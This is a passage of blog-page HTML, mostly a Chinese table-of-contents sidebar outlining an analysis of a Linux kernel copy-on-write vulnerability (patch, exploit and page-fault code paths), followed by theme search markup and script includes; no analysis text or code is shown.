href="#%EF%BC%882%EF%BC%89%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6"><span class="nav-text">（2）写时复制</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#fork%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6"><span class="nav-text">fork场景下的写时复制</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%A7%81%E6%9C%89%E6%98%A0%E5%B0%84%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6"><span class="nav-text">私有映射写时复制</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-text">一、补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81exp%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="nav-text">二、exp分析（未完成）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">三、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%880%EF%BC%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-text">（0）函数调用栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E7%AC%AC%E4%B8%80%E6%AC%A1write"><span class="nav-text">（1）第一次write</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#proc-mem-operations"><span class="nav-text">proc_mem_operations</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#access-remote-vm"><span class="nav-text">__access_remote_vm</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#get-user-pages"><span class="nav-text">__get_user_pages</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#follow-page-pte"><span class="nav-text">follow_page_pte</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#faultin-page"><span class="nav-text">faultin_page</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#handle-pte-fault"><span class="nav-text">handle_pte_fault</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#do-fault"><span class="nav-text">do_fault</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#do-cow-fault"><span class="nav-text">do_cow_fault</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#do-set-pte"><span class="nav-text">do_set_pte</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#maybe-mkwrite"><span class="nav-text">maybe_mkwrite</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%AC%AC%E4%BA%8C%E6%AC%A1write"><span class="nav-text">（2）第二次write</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#follow-page-pte-1"><span class="nav-text">follow_page_pte</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#handle-pte-fault-1"><span class="nav-text">handle_pte_fault</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#wp-page-reuse"><span class="nav-text">wp_page_reuse</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#faultin-page-1"><span class="nav-text">faultin_page</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#get-user-pages-1"><span class="nav-text">__get_user_pages</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89madvise%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%AC%A1write"><span class="nav-text">（3）madvise与第三次write</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#get-user-pages-2"><span class="nav-text">__get_user_pages</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#handle-pte-fault-2"><span class="nav-text">handle_pte_fault</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#do-read-fault"><span class="nav-text">do_read_fault</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">四、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E6%80%BB%E7%BB%93"><span class="nav-text">详细总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%BD%92%E7%BA%B3"><span class="nav-text">简单归纳</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B"><span class="nav-text">正常流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%81%E7%A8%8B"><span class="nav-text">漏洞流程</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>




<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
